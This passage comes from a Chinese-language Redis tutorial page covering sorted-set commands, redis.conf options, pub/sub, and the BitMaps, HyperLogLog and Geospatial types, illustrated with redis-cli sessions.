3) &quot;cpp&quot;
4) &quot;java&quot;
# zincrby &lt;Key&gt; increment &lt;Value&gt; =&gt; &#x4E3A;&#x5143;&#x7D20;&#x7684; Score &#x52A0;&#x4E0A;&#x589E;&#x91CF;
127.0.0.1:6379&gt; zincrby topn 5 java
&quot;7&quot;
# zrem &lt;Key&gt; &lt;Value&gt; =&gt; &#x5220;&#x9664;&#x8BE5;&#x96C6;&#x5408;&#x4E0B;&#x6307;&#x5B9A;&#x503C;&#x7684;&#x5143;&#x7D20;
127.0.0.1:6379&gt; zrem topn php
(integer) 1
# zcount &lt;Key&gt; min max =&gt; &#x7EDF;&#x8BA1;&#x8BE5;&#x96C6;&#x5408;&#x5206;&#x6570;&#x533A;&#x95F4;&#x5185;&#x7684;&#x5143;&#x7D20;&#x4E2A;&#x6570;
127.0.0.1:6379&gt; zcount topn 2 3
(integer) 1
# zrank &lt;Key&gt; &lt;Value&gt; =&gt; &#x8FD4;&#x56DE;&#x8BE5;&#x503C;&#x5728;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6392;&#x540D; -&gt; &#x4ECE;0&#x5F00;&#x59CB;
127.0.0.1:6379&gt; zrank topn java
(integer) 2
127.0.0.1:6379&gt; zrank topn cpp
(integer) 0
</code></pre>
<h3 id="redis-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6">Redis &#x914D;&#x7F6E;&#x6587;&#x4EF6;</h3>
<ul>
<li>
<p>Units =&gt; &#x914D;&#x7F6E;&#x7684;&#x5927;&#x5C0F;&#x5355;&#x4F4D;&#xFF0C;&#x53EA;&#x652F;&#x6301; bytes&#xFF0C;&#x4E0D;&#x652F;&#x6301; bit&#xFF0C;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#x3002;</p>
</li>
<li>
<p>INCLUDES =&gt; &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x53EF;&#x4F5C;&#x4E3A;&#x603B;&#x95F8;&#x5305;&#x542B;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x3002;</p>
</li>
</ul>
<p>&#x5E38;&#x7528;&#x4E8E;&#x5728;&#x4FDD;&#x6301;&#x540C;&#x4E00;&#x4E3B;&#x673A;&#x4E0A;&#x7684;&#x591A;&#x4E2A;&#x5B9E;&#x4F8B;&#x4E4B;&#x95F4;&#x4F7F;&#x7528;&#x76F8;&#x540C;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8BA9;&#x6BCF;&#x4E2A;&#x5B9E;&#x4F8B;&#x53C8;&#x62E5;&#x6709;&#x5404;&#x81EA;&#x7279;&#x70B9;&#x7684;&#x914D;&#x7F6E;&#x3002;</p>
<ul>
<li>NETWORK</li>
</ul>
<p>bind=127.0.0.1 =&gt; &#x53EA;&#x63A5;&#x6536;&#x672C;&#x673A;&#x7684;&#x8BBF;&#x95EE;&#x8BF7;&#x6C42;&#xFF0C;&#x4E0D;&#x5199;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x65E0;&#x9650;&#x5236;&#x63A5;&#x6536;&#x4EFB;&#x4F55;&#x5730;&#x5740;&#x7684;&#x8BBF;&#x95EE;&#x3002;&#x751F;&#x4EA7;&#x73AF;&#x5883;&#x4E2D;&#x5E38;&#x5C06;&#x5176;&#x6CE8;&#x91CA;&#x3002;</p>
<p>protect-mode =&gt; &#x6CA1;&#x6709;&#x8BBE;&#x5B9A; bind ip &#x4E0E;&#x5BC6;&#x7801;&#x65F6;&#xFF0C;&#x53EA;&#x5141;&#x8BB8;&#x63A5;&#x6536;&#x672C;&#x673A;&#x7684;&#x54CD;&#x5E94;&#x3002;</p>
<p>backlog =&gt; &#x8FDE;&#x63A5;&#x961F;&#x5217;&#x3002;&#x5176;&#x961F;&#x5217;&#x603B;&#x548C; = &#x672A;&#x5B8C;&#x6210;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x961F;&#x5217; + &#x5DF2;&#x5B8C;&#x6210;&#x4E09;&#x6B21;&#x63E1;&#x624B;&#x961F;&#x5217;&#x3002;&#x9AD8;&#x5E76;&#x53D1;&#x73AF;&#x5883;&#x5E94;&#x63D0;&#x9AD8;&#x6B64;&#x503C;&#x4EE5;&#x907F;&#x514D;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x7684;&#x901F;&#x5EA6;&#x95EE;&#x9898;&#x3002;</p>
<blockquote>
<p>&#x901A;&#x5E38; /proc/sys/net/core/somaxconn &#x503C;&#x662F;&#x56FA;&#x5B9A;&#x7684; 128&#xFF0C;&#x9AD8;&#x5E76;&#x53D1;&#x60C5;&#x51B5;&#x4E0B;&#x5E94;&#x589E;&#x5927; /proc/sys/net/core/somaxconn &amp; /proc/sys/net/ipv4/tcp_max_syn_backlog&#x3002;</p>
</blockquote>
<p>timeout 300 =&gt; &#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x95F2;&#x7F6E;&#x6307;&#x5B9A;&#x65F6;&#x95F4;&#x540E;&#x5173;&#x95ED;&#x8FDE;&#x63A5; -&gt; 0 &#x8868;&#x793A;&#x5173;&#x95ED;&#x8BE5;&#x529F;&#x80FD;&#x3002;</p>
<ul>
<li>GENERAL</li>
</ul>
<p>daemonize =&gt; &#x540E;&#x53F0;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#xFF1B;pidfile =&gt; &#x5B58;&#x653E;&#x8FDB;&#x7A0B;&#x53F7;&#x6587;&#x4EF6;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B9E;&#x4F8B;&#x7684;&#x4EA7;&#x751F;&#x90FD;&#x4E0D;&#x540C;&#x3002;&#x4EE5;&#x5B88;&#x62A4;&#x8FDB;&#x7A0B;&#x65B9;&#x5F0F;&#x8FD0;&#x884C;&#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x4F1A;&#x628A; pid &#x5199;&#x5165; /var/run/redis.pid &#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x6307;&#x5B9A; pidfile /var/run/redis.pid&#x3002;</p>
<ul>
<li>LIMITS</li>
</ul>
<p>maxclients &#x8BBE;&#x7F6E; Redis &#x540C;&#x65F6;&#x53EF;&#x4E0E;&#x591A;&#x5C11;&#x5BA2;&#x6237;&#x7AEF;&#x8FDB;&#x884C;&#x8FDE;&#x63A5;&#xFF0C;&#x9ED8;&#x8BA4; 10000 &#x4E2A;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x82E5;&#x8FBE;&#x5230;&#x6B64;&#x9650;&#x5236;&#xFF0C;redis &#x5219;&#x4F1A;&#x62D2;&#x7EDD;&#x65B0;&#x7684;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#xFF0C;&#x5E76;&#x4E14;&#x5411;&#x8FDE;&#x63A5;&#x8BF7;&#x6C42;&#x65B9;&#x53D1;&#x51FA; max number of clients reached &#x4EE5;&#x4F5C;&#x56DE;&#x5E94;&#x3002;</p>
<p>maxmemory &#x6307;&#x5B9A; Redis &#x6700;&#x5927;&#x5185;&#x5B58;&#x9650;&#x5236;&#xFF0C;&#x5EFA;&#x8BAE;&#x5FC5;&#x987B;&#x8BBE;&#x7F6E;&#xFF0C;&#x5426;&#x5219;&#x5185;&#x5B58;&#x5360;&#x6EE1;&#x4F1A;&#x9020;&#x6210;&#x670D;&#x52A1;&#x5668;&#x5B95;&#x673A;&#x3002;&#x82E5;&#x8FBE;&#x5230; Redis &#x53EF;&#x4F7F;&#x7528;&#x5185;&#x5B58;&#x4E0A;&#x9650;&#xFF0C;&#x5219;&#x4F1A;&#x8BD5;&#x56FE;&#x79FB;&#x9664;&#x5185;&#x90E8;&#x6570;&#x636E;&#xFF0C;&#x79FB;&#x9664;&#x89C4;&#x5219;&#x53EF;&#x901A;&#x8FC7; maxmemory-policy &#x6307;&#x5B9A;&#x3002;</p>
<blockquote>
<p>Maxmemory-policy<br>
&#xFF08;1&#xFF09;volatile-lru =&gt; &#x4F7F;&#x7528; LRU &#x7B97;&#x6CD5;&#x79FB;&#x9664; Key&#xFF08;&#x53EA;&#x9488;&#x5BF9;&#x8BBE;&#x7F6E;&#x4E86;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x7684;&#x952E;&#xFF09;<br>
&#xFF08;2&#xFF09;allkeys-lru =&gt; &#x4F7F;&#x7528; LRU &#x7B97;&#x6CD5;&#x79FB;&#x9664; Key<br>
&#xFF08;3&#xFF09;volatile-random =&gt; &#x968F;&#x673A;&#x79FB;&#x9664;&#x8FC7;&#x671F;&#x96C6;&#x5408;&#x4E2D;&#x7684; Key<br>
&#xFF08;4&#xFF09;allkeys-random =&gt; &#x968F;&#x673A;&#x7684;&#x79FB;&#x9664; Key<br>
&#xFF08;5&#xFF09;volatile-ttl =&gt; &#x79FB;&#x9664; TTL &#x503C;&#x6700;&#x5C0F;&#x7684; Key&#xFF0C;&#x5373;&#x90A3;&#x4E9B;&#x6700;&#x8FD1;&#x8981;&#x8FC7;&#x671F;&#x7684; Key<br>
&#xFF08;6&#xFF09;noeviction =&gt; &#x4E0D;&#x8FDB;&#x884C;&#x79FB;&#x9664;&#x3002;&#x9488;&#x5BF9;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x53EA;&#x8FD4;&#x56DE;&#x9519;&#x8BEF;&#x4FE1;&#x606F;</p>
</blockquote>
<p>Maxmemory-samples &#x8BBE;&#x7F6E;&#x6837;&#x672C;&#x6570;&#x91CF;&#x3002;&#x4E00;&#x822C;&#x8BBE;&#x7F6E; 3-7 &#x7684;&#x6570;&#x5B57;&#xFF0C;&#x867D;&#x7136;&#x6837;&#x672C;&#x8D8A;&#x5C0F;&#x8D8A;&#x4E0D;&#x7CBE;&#x786E;&#xFF0C;&#x4F46;&#x662F;&#x6027;&#x80FD;&#x6D88;&#x8017;&#x66F4;&#x5C0F;&#x3002;</p>
<ul>
<li>REPLICATION</li>
</ul>
<p>slaveof &lt;masterip&gt; &lt;masterport&gt; &#x8BBE;&#x7F6E;&#x5F53;&#x672C;&#x673A;&#x4E3A; slav &#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x8BBE;&#x7F6E; master &#x670D;&#x52A1;&#x7684; IP &#x5730;&#x5740;&#x53CA;&#x7AEF;&#x53E3;&#xFF0C;&#x5728; Redis &#x542F;&#x52A8;&#x65F6;&#x81EA;&#x52A8;&#x4ECE; master &#x8FDB;&#x884C;&#x6570;&#x636E;&#x540C;&#x6B65;&#x3002;&#x5728; RedisV7 &#x4E2D;&#x6539;&#x6210; replicaof &lt;masterip&gt; &lt;masterport&gt;&#x3002;</p>
<p>masterauth &lt;master-password&gt; &#x662F;&#x5F53; master &#x670D;&#x52A1;&#x8BBE;&#x7F6E;&#x4E86;&#x5BC6;&#x7801;&#x4FDD;&#x62A4;&#x65F6;&#xFF0C;slav &#x670D;&#x52A1;&#x8FDE;&#x63A5;master &#x7684;&#x5BC6;&#x7801;&#x3002;</p>
<pre><code class="language-conf"># masterauth &lt;master-password&gt;
</code></pre>
<ul>
<li>SECURITY</li>
</ul>
<p>requirepass foobared &#x8BBE;&#x7F6E; Redis &#x8FDE;&#x63A5;&#x5BC6;&#x7801;&#x3002;&#x5982;&#x679C;&#x914D;&#x7F6E;&#x4E86;&#x8FDE;&#x63A5;&#x5BC6;&#x7801;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x5728;&#x8FDE;&#x63A5;&#x65F6;&#x9700;&#x8981;&#x901A;&#x8FC7; AUTH &lt;password&gt; &#x547D;&#x4EE4;&#x63D0;&#x4F9B;&#x5BC6;&#x7801;&#xFF0C;&#x9ED8;&#x8BA4;&#x5173;&#x95ED;&#x3002;</p>
<pre><code class="language-conf"># requirepass foobared
</code></pre>
<ul>
<li>ADVANCED CONFIG</li>
</ul>
<p>activerehashing yes &#x6307;&#x5B9A;&#x662F;&#x5426;&#x6FC0;&#x6D3B;&#x91CD;&#x7F6E;&#x54C8;&#x5E0C;&#xFF0C;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x3002;</p>
<p>hash-max-listpack &#x6307;&#x5B9A;&#x5728;&#x8D85;&#x8FC7;&#x4E00;&#x5B9A;&#x7684;&#x6570;&#x91CF;&#x6216;&#x6700;&#x5927;&#x7684;&#x5143;&#x7D20;&#x8D85;&#x8FC7;&#x67D0;&#x4E00;&#x4E34;&#x754C;&#x503C;&#x65F6;&#xFF0C;&#x91C7;&#x7528;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x54C8;&#x5E0C;&#x7B97;&#x6CD5;&#x3002;&#x65E7;&#x7248;&#x672C;&#x662F; hash-max-zipmap&#x3002;</p>
<pre><code class="language-conf"># Hashes are encoded using a memory efficient data structure when they have a
# small number of entries, and the biggest entry does not exceed a given
# threshold. These thresholds can be configured using the following directives.
hash-max-listpack-entries 512
hash-max-listpack-value 64
</code></pre>
<h3 id="%E5%8F%91%E5%B8%83%E5%92%8C%E8%AE%A2%E9%98%85">&#x53D1;&#x5E03;&#x548C;&#x8BA2;&#x9605;</h3>
<p>Redis &#x5177;&#x5907;&#x53D1;&#x5E03;&#x8BA2;&#x9605;&#x529F;&#x80FD;&#xFF0C;&#x4F46;&#x662F;&#x5176;&#x4E3B;&#x8981;&#x4EFB;&#x52A1;&#x8FD8;&#x662F;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x7F13;&#x5B58;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x79CD;&#x8BA2;&#x9605;&#x53D1;&#x5E03;&#x5E38;&#x7531;&#x4E13;&#x95E8;&#x7684; kafka&#x3001;activemq &#x7B49;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x6765;&#x5B8C;&#x6210;&#x3002;</p>
<pre><code class="language-shell"># &#x89C6;&#x7A97;&#x4E00;
$ /usr/local/bin/redis-cli
# &#x8BA2;&#x9605;&#x9891;&#x9053;
127.0.0.1:6379&gt; SUBSCRIBE channel1
Reading messages... (press Ctrl-C to quit)
1) &quot;subscribe&quot;
2) &quot;channel1&quot;
3) (integer) 1
1) &quot;message&quot;
2) &quot;channel1&quot;
3) &quot;helloChannel1&quot;
# &#x89C6;&#x7A97;&#x4E8C;
# &#x53D1;&#x5E03;&#x4FE1;&#x606F;
PUBLISH channel1 helloChannel1
(integer) 1
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="redis6-%E6%96%B0%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">Redis6 &#x65B0;&#x6570;&#x636E;&#x7C7B;&#x578B;</h2>
<h3 id="bitmaps">BitMaps</h3>
<p>BitMaps &#x672C;&#x8EAB;&#x4E0D;&#x662F;&#x4E00;&#x79CD;&#x6570;&#x636E;&#x7C7B;&#x578B;&#xFF0C;&#x800C;&#x662F;&#x5B57;&#x7B26;&#x4E32; Key-Value&#xFF0C;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x5BF9;&#x5B57;&#x7B26;&#x4E32;&#x7684;&#x4F4D;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#x3002;&#x7C7B;&#x4F3C; &quot;abc&quot; &#x5B57;&#x7B26;&#x4E32;&#x662F;&#x4E09;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x6BCF;&#x4E2A;&#x5B57;&#x8282; 8 &#x4F4D;&#xFF0C;&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#x901A;&#x8FC7; ASCII &#x7801; 97&#x3001;98&#x3001;99 &#x8F6C;&#x6362;&#x4E3A;&#x5BF9;&#x5E94;&#x4E8C;&#x8FDB;&#x5236; 01100001&#x3001;01100010&#x3001;01100011&#x3002;&#x901A;&#x8FC7;&#x5408;&#x7406;&#x7684;&#x64CD;&#x4F5C;&#x4F4D;&#x63D0;&#x9AD8;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x548C;&#x5F00;&#x53D1;&#x6548;&#x7387;&#x3002;</p>
<p>BitMaps &#x53EF;&#x89C6;&#x4F5C;&#x4E00;&#x4E2A;&#x4EE5;&#x4F4D;&#x4E3A;&#x5355;&#x4F4D;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x6570;&#x7EC4;&#x4E2D;&#x6BCF;&#x4E2A;&#x5355;&#x5143;&#x53EA;&#x5B58;&#x50A8; 0 &#x548C; 1&#xFF0C;&#x6570;&#x7EC4;&#x4E0B;&#x6807;&#x4E3A;&#x504F;&#x79FB;&#x91CF;&#x3002;<code>setbit &lt;Key&gt; &lt;Offset&gt; &lt;Value&gt;</code> &#x8BBE;&#x7F6E; bitmaps &#x4E2D;&#x67D0;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x7684;&#x503C; 0 &#x6216; 1&#x3002;<code>getbit &lt;Key&gt; &lt;Offset&gt;</code> &#x83B7;&#x53D6; bitmaps &#x4E2D;&#x67D0;&#x4E2A;&#x504F;&#x79FB;&#x91CF;&#x7684;&#x503C;&#x3002;<code>bitcount &lt;Key&gt; [start end]</code> &#x7EDF;&#x8BA1;&#x5B57;&#x7B26;&#x4E32;&#x4ECE; start &#x5230; end &#x88AB;&#x8BBE;&#x7F6E;&#x4E3A; 1 &#x7684; bit &#x6570;&#x3002;&#x591A; bitmaps &#x96C6;&#x5408;&#x8FD0;&#x7B97; <code>bitop and|or|not|xor &lt;DestKey&gt; [Key...]</code> &#x7ED3;&#x679C;&#x4FDD;&#x5B58; DestKey&#x3002;</p>
<p>&#x5E38;&#x5E94;&#x7528;&#x5C06;&#x6BCF;&#x4E2A;&#x72EC;&#x7ACB;&#x7528;&#x6237;&#x662F;&#x5426;&#x8BBF;&#x95EE;&#x8FC7;&#x7F51;&#x7AD9;&#x5B58;&#x653E;&#x5728; BitMaps&#xFF0C;&#x5C06;&#x8BBF;&#x95EE;&#x7684;&#x7528;&#x6237;&#x8BB0;&#x4F5C; 1&#xFF0C;&#x6CA1;&#x6709;&#x8BBF;&#x95EE;&#x7684;&#x7528;&#x6237;&#x8BB0;&#x4F5C; 0&#xFF0C;&#x504F;&#x79FB;&#x91CF;&#x4F5C;&#x4E3A;&#x7528;&#x6237; id&#x3002;</p>
<p>&#x9700;&#x6CE8;&#x610F;&#x5728;&#x5F00;&#x53D1;&#x4E2D;&#x7528;&#x6237; id &#x5E38;&#x4EE5;&#x6307;&#x5B9A;&#x6570;&#x5B57;&#x5F00;&#x5934;&#xFF0C;&#x82E5;&#x76F4;&#x63A5;&#x5C06;&#x7528;&#x6237; id &#x548C; bitmaps &#x7684;&#x504F;&#x79FB;&#x91CF;&#x5BF9;&#x5E94;&#x4F1A;&#x9020;&#x6210;&#x6D6A;&#x8D39;&#xFF0C;&#x901A;&#x5E38;&#x505A;&#x6CD5;&#x662F;&#x6BCF;&#x6B21;&#x505A; setbit &#x64CD;&#x4F5C;&#x65F6;&#x5C06;&#x7528;&#x6237; id &#x51CF;&#x53BB;&#x8FD9;&#x4E2A;&#x6307;&#x5B9A;&#x6570;&#x5B57;&#x3002;</p>
<pre><code class="language-shell"># &#x73B0;&#x6709;20&#x4E2A;&#x7528;&#x6237; =&gt; &#x5176;&#x4E2D; 1 6 11 15 19 &#x4E8E; 1 &#x6708;&#x8BBF;&#x95EE;&#x7F51;&#x7AD9; =&gt; &#x5BF9; bitmap &#x8FDB;&#x884C;&#x521D;&#x59CB;&#x5316;
127.0.0.1:6379&gt; setbit users:202101 1 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 6 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 11 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 15 1
(integer) 0
127.0.0.1:6379&gt; setbit users:202101 19 1
(integer) 0
127.0.0.1:6379&gt; getbit users:202101 1
(integer) 1
127.0.0.1:6379&gt; bitcount users:202101
(integer) 5
# &#x65E5;&#x671F;&#x9650;&#x5B9A;&#x8BBF;&#x95EE;&#x7F51;&#x7AD9;&#x7684;&#x76F8;&#x540C;&#x4EBA;&#x4EBA;&#x6570;
setbit unique:users:20201101 1 1
setbit unique:users:20201101 2 1
setbit unique:users:20201101 5 1
setbit unique:users:20201101 9 1
setbit unique:users:20201102 0 1
setbit unique:users:20201102 1 1
setbit unique:users:20201102 4 1
setbit unique:users:20201102 9 1
bitop and unique:users:and:20201101_02 unique:users:20201102 unique:users:20201101
(integer) 2
127.0.0.1:6379&gt; bitcount unique:users:and:20201101_02
(integer) 2
</code></pre>
<p>&#x82E5;&#x7F51;&#x7AD9;&#x6709;&#x4E00;&#x4EBF;&#x7528;&#x6237;&#xFF0C;&#x6BCF;&#x5929;&#x72EC;&#x7ACB;&#x8BBF;&#x95EE;&#x7684;&#x7528;&#x6237;&#x6709;&#x4E94;&#x5343;&#x4E07;&#xFF0C;&#x90A3;&#x4E48;&#x6BCF;&#x5929;&#x7528;&#x96C6;&#x5408;&#x548C; Bitmaps &#x5206;&#x522B;&#x5B58;&#x50A8;&#x6D3B;&#x8DC3;&#x7528;&#x6237;&#x5BF9;&#x6BD4;&#x3002;</p>
<table>
<thead>
<tr>
<th style="text-align:center">&#x6570;&#x636E;&#x7C7B;&#x578B;</th>
<th style="text-align:center">&#x6BCF;&#x4E2A;&#x7528;&#x6237; id &#x5360;&#x7528;&#x7A7A;&#x95F4;</th>
<th style="text-align:center">&#x9700;&#x8981;&#x5B58;&#x50A8;&#x7684;&#x7528;&#x6237;&#x91CF;</th>
<th style="text-align:center">&#x5168;&#x90E8;&#x5185;&#x5B58;&#x91CF;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">&#x96C6;&#x5408;&#x7C7B;&#x578B;</td>
<td style="text-align:center">64&#x4F4D;</td>
<td style="text-align:center">50000000</td>
<td style="text-align:center">64&#x4F4D;*50000000=400MB</td>
</tr>
<tr>
<td style="text-align:center">Bitmaps</td>
<td style="text-align:center">1&#x4F4D;</td>
<td style="text-align:center">100000000</td>
<td style="text-align:center">1&#x4F4D;*100000000=12.5MB</td>
</tr>
</tbody>
</table>
<h3 id="hyperloglog">HyperLogLog</h3>
<p>&#x72EC;&#x7ACB;&#x8BBF;&#x5BA2; UniqueVisitor UV&#x3001;&#x72EC;&#x7ACB; IP &#x6570;&#x3001;&#x641C;&#x7D22;&#x8BB0;&#x5F55;&#x7B49;&#x9700;&#x8981;&#x53BB;&#x91CD;&#x548C;&#x8BA1;&#x6570;&#x7684;&#x95EE;&#x9898;&#x79F0;&#x4E3A;&#x57FA;&#x6570;&#x95EE;&#x9898;&#x3002;&#x867D;&#x8BF4; Mysql &#x80FD;&#x4F7F;&#x7528; distinct &#x548C; count &#x5904;&#x7406;&#xFF1B;Redis &#x80FD;&#x63D0;&#x4F9B; Hash&#x3001;Set &#x548C; BitMaps&#xFF0C;&#x4F46;&#x968F;&#x7740;&#x6570;&#x636E;&#x589E;&#x52A0;&#xFF0C;&#x5360;&#x7528;&#x7A7A;&#x95F4;&#x589E;&#x5927;&#xFF0C;&#x6570;&#x636E;&#x96C6;&#x663E;&#x5F97;&#x6709;&#x4E9B;&#x6349;&#x895F;&#x89C1;&#x8098;&#x3002;</p>
<p>HyperLogLog &#x662F;&#x9002;&#x7528;&#x4E8E;&#x505A;&#x57FA;&#x6570;&#x7EDF;&#x8BA1;&#x7684;&#x7B97;&#x6CD5;&#x3002;&#x6BCF;&#x4E2A; HyperLogLog &#x952E;&#x53EA;&#x9700;&#x82B1;&#x8D39; 12 KB &#x5185;&#x5B58;&#xFF0C;&#x5C31;&#x53EF;&#x8BA1;&#x7B97; 2^64 &#x4E2A;&#x4E0D;&#x540C;&#x5143;&#x7D20;&#x7684;&#x57FA;&#x6570;&#x3002;&#x5728;&#x8F93;&#x5165;&#x5143;&#x7D20;&#x6570;&#x91CF;&#x6216;&#x4F53;&#x79EF;&#x5DE8;&#x5927;&#x65F6;&#xFF0C;&#x8BA1;&#x7B97;&#x57FA;&#x6570;&#x6240;&#x9700;&#x7A7A;&#x95F4;&#x662F;&#x56FA;&#x5B9A;&#x6709;&#x9650;&#x7684;&#x3002;&#x56E0;&#x5176;&#x53EA;&#x636E;&#x8F93;&#x5165;&#x5143;&#x7D20;&#x8BA1;&#x7B97;&#x57FA;&#x6570;&#x800C;&#x4E0D;&#x4F1A;&#x5B58;&#x50A8;&#x8F93;&#x5165;&#x5143;&#x7D20;&#x672C;&#x8EAB;&#xFF0C;&#x6545;&#x4E0D;&#x80FD;&#x50CF;&#x96C6;&#x5408;&#x822C;&#x8FD4;&#x56DE;&#x8F93;&#x5165;&#x7684;&#x5404;&#x4E2A;&#x5143;&#x7D20;&#x3002;</p>
<p>&#x6570;&#x636E;&#x96C6; {1,3,5,7,5,7,8} &#x4E2D;&#x7684;&#x57FA;&#x6570;&#x96C6;&#x4E3A; {1,3,5,7,8}&#xFF0C;&#x57FA;&#x6570;&#xFF0C;&#x5373;&#x4E0D;&#x53EF;&#x91CD;&#x590D;&#x5143;&#x7D20;&#x4E3A; 5&#x3002;&#x57FA;&#x6570;&#x4F30;&#x8BA1;&#x5C31;&#x662F;&#x5728;&#x8BEF;&#x5DEE;&#x53EF;&#x63A5;&#x6536;&#x8303;&#x56F4;&#x5185;&#x5FEB;&#x901F;&#x8BA1;&#x7B97;&#x57FA;&#x6570;&#x3002;</p>
<p><code>pfadd &lt;Key&gt; &lt;Element&gt; [Element...]</code> &#x6DFB;&#x52A0;&#x6307;&#x5B9A;&#x5143;&#x7D20;&#x5230; HyperLogLog&#x3002;&#x8FD1;&#x4F3C;&#x57FA;&#x6570;&#x53D8;&#x5316;&#x8FD4;&#x56DE; 1&#xFF0C;&#x5426;&#x5219;&#x8FD4;&#x56DE; 0&#x3002;<code>pfcount &lt;Key&gt; [key...]</code> &#x8BA1;&#x7B97; HLL &#x8FD1;&#x4F3C;&#x57FA;&#x6570;&#x3002;<code>pfmerge &lt;DestKey&gt; &lt;SourceKey&gt; [SourceKey]</code> &#x5C06;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A; HLL &#x5408;&#x5E76;&#x540E;&#x7684;&#x7ED3;&#x679C;&#x5B58;&#x50A8;&#x4E8E;&#x53E6;&#x4E00;&#x4E2A; HLL&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; pfadd program &quot;java&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd program &quot;node&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd program &quot;javascript&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd program &quot;java&quot;
(integer) 0
127.0.0.1:6379&gt; pfadd program &quot;java&quot; &quot;cpp&quot; &quot;c&quot;
(integer) 1
127.0.0.1:6379&gt; pfcount program
(integer) 5
127.0.0.1:6379&gt; pfadd language &quot;java&quot; &quot;node&quot; &quot;javascript&quot; &quot;cpp&quot;
(integer) 1
127.0.0.1:6379&gt; pfadd language &quot;java&quot; &quot;node&quot; &quot;javascript&quot; &quot;cpp&quot;
(integer) 0
127.0.0.1:6379&gt; pfmerge mergetable program language
OK
127.0.0.1:6379&gt; pfcount mergetable
(integer) 5
</code></pre>
<h3 id="geospatial">Geospatial</h3>
<p>Redis &#x63D0;&#x4F9B;&#x5BF9;&#x5730;&#x7406;&#x4FE1;&#x606F;&#x652F;&#x6301;&#xFF0C;Geospatial &#x63D0;&#x4F9B;&#x4E0E;&#x5730;&#x7406;&#x7A7A;&#x95F4;&#x7D22;&#x5F15;&#x76F8;&#x5173;&#x7684;&#x547D;&#x4EE4;&#x3002;</p>
<p><code>geoadd &lt;Key&gt; &lt;Longitude&gt; &lt;Latitude&gt; &lt;Member&gt; [...]</code> &#x6DFB;&#x52A0;&#x5730;&#x7406;&#x4F4D;&#x7F6E;&#x3002;</p>
<p><code>geopos &lt;Key&gt; &lt;Member&gt; [Member...]</code> &#x83B7;&#x5F97;&#x6307;&#x5B9A;&#x5730;&#x533A;&#x7684;&#x5750;&#x6807;&#x503C;&#x3002;</p>
<p><code>geodist &lt;Key&gt; &lt;Member1&gt; &lt;Member2&gt; [m|km|ft|mi]</code> &#x83B7;&#x53D6;&#x4F4D;&#x7F6E;&#x76F4;&#x7EBF;&#x8DDD;&#x79BB;&#x3002;</p>
<p><code>georadius &lt;Key&gt; &lt;Longitude&gt; &lt;Latitude&gt; radius m|km|ft|mi</code> &#x4EE5;&#x7ED9;&#x5B9A;&#x7684;&#x7ECF;&#x7EAC;&#x5EA6;&#x4E3A;&#x4E2D;&#x5FC3;&#xFF0C;&#x627E;&#x51FA;&#x67D0;&#x4E00;&#x534A;&#x5F84;&#x5185;&#x7684;&#x5143;&#x7D20;&#x3002;&#x53EF;&#x4F5C;&#x4E3A;&#x5FAE;&#x4FE1;&#x9644;&#x8FD1;&#x7684;&#x4EBA;&#x5B9E;&#x73B0;&#x65B9;&#x6CD5;&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; geoadd china:city 112.93 28.23 changsha 114.05 22.52 shenzhen
(integer) 2
127.0.0.1:6379&gt; geopos china:city changsha
1) 1) &quot;112.92999833822250366&quot;
   2) &quot;28.2299993949683099&quot;
127.0.0.1:6379&gt; geodist china:city changsha shenzhen
&quot;644984.9761&quot;
127.0.0.1:6379&gt; georadius china:city 111 20 1000 KM
1) &quot;shenzhen&quot;
2) &quot;changsha&quot;
</code></pre>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="jedis">Jedis</h2>
